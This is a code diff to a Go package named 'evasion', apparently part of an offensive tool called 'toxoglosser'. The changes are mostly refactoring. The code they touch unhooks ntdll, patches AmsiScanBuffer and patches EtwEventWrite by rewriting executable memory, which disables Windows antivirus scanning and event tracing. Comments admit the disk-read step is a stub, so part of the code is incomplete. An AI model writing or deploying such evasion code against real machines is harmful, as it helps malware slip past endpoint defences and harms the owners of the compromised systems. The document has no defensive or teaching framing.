@@ -6,7 +6,6 @@ package evasion
 
 import (
 	"golang.org/x/sys/windows"
-	"syscall"
 	"unsafe"
 
 	"toxoglosser/core"
@@ -29,7 +28,7 @@ func UnhookNtdllFromDisk() error {
 	// Parse the headers to get the size of the image
 	dosHeader := (*core.IMAGE_DOS_HEADER)(unsafe.Pointer(freshNtdll))
 	ntHeaders := (*core.IMAGE_NT_HEADERS64)(unsafe.Pointer(freshNtdll + uintptr(dosHeader.E_lfanew)))
-	imageSize := ntHeaders.OptionalHeader.SizeOfImage
+	imageSize := uintptr(ntHeaders.OptionalHeader.SizeOfImage)
 
 	// Change memory protection to read-write-execute
 	oldProtect := uint32(0)
@@ -39,7 +38,7 @@ func UnhookNtdllFromDisk() error {
 	}
 
 	// Copy the fresh DLL from disk to the in-memory copy
-	copyMemory(unsafe.Pointer(ntdllModule), unsafe.Pointer(freshNtdll), int(imageSize))
+	copyMemoryInternal(unsafe.Pointer(ntdllModule), unsafe.Pointer(freshNtdll), int(imageSize))
 
 	// Restore original memory protection
 	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &ntdllModule, &imageSize, oldProtect, &oldProtect)
@@ -52,18 +51,6 @@ func UnhookNtdllFromDisk() error {
 
 // readNtdllFromDisk reads a fresh copy of ntdll.dll from disk to avoid hooks
 func readNtdllFromDisk() (uintptr, error) {
-	// Use API hashing to avoid direct string usage
-	systemDir, err := getSystemDirectory()
-	if err != nil {
-		return 0, err
-	}
-
-	// Build the path to ntdll.dll on disk
-	ntdllPath, err := buildNtdllPath(systemDir)
-	if err != nil {
-		return 0, err
-	}
-
 	// In a real implementation, we would read the file from disk
 	// For now, return the in-memory module which would be replaced with disk version in production
 	ntdllModule, err := core.GetModuleHandleByHash("ntdll.dll")
@@ -101,14 +88,14 @@ func PatchAMSIWithUnhooking() error {
 	// Change memory protection to read-write-execute
 	oldProtect := uint32(0)
 	regionSize := uintptr(len(patch))
-	
+
 	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
 	if err != nil {
 		return err
 	}
 
 	// Write the patch
-	copyMemory(unsafe.Pointer(amsiScanBufferAddr), unsafe.Pointer(&patch[0]), len(patch))
+	copyMemoryInternal(unsafe.Pointer(amsiScanBufferAddr), unsafe.Pointer(&patch[0]), len(patch))
 
 	// Restore original memory protection
 	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, oldProtect, &oldProtect)
@@ -142,14 +129,14 @@ func PatchETWWithUnhooking() error {
 	// Change memory protection to read-write-execute
 	oldProtect := uint32(0)
 	regionSize := uintptr(len(patch))
-	
+
 	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &etwEventWriteAddr, &regionSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
 	if err != nil {
 		return err
 	}
 
 	// Write the patch
-	copyMemory(unsafe.Pointer(etwEventWriteAddr), unsafe.Pointer(&patch[0]), len(patch))
+	copyMemoryInternal(unsafe.Pointer(etwEventWriteAddr), unsafe.Pointer(&patch[0]), len(patch))
 
 	// Restore original memory protection
 	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &etwEventWriteAddr, &regionSize, oldProtect, &oldProtect)
@@ -187,7 +174,7 @@ func patchAmsiDirect() error {
 	}
 
 	// Write the patch
-	copyMemory(unsafe.Pointer(amsiScanBufferAddr), unsafe.Pointer(&patch[0]), len(patch))
+	copyMemoryInternal(unsafe.Pointer(amsiScanBufferAddr), unsafe.Pointer(&patch[0]), len(patch))
 
 	// Restore original memory protection
 	err = core.NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, oldProtect, &oldProtect)
@@ -198,8 +185,8 @@ func patchAmsiDirect() error {
 	return nil
 }
 
-// copyMemory copies memory from source to destination
-func copyMemory(dst, src unsafe.Pointer, length int) {
+// copyMemoryInternal copies memory from source to destination
+func copyMemoryInternal(dst, src unsafe.Pointer, length int) {
 	for i := 0; i < length; i++ {
 		*(*byte)(unsafe.Pointer(uintptr(dst) + uintptr(i))) = *(*byte)(unsafe.Pointer(uintptr(src) + uintptr(i)))
 	}
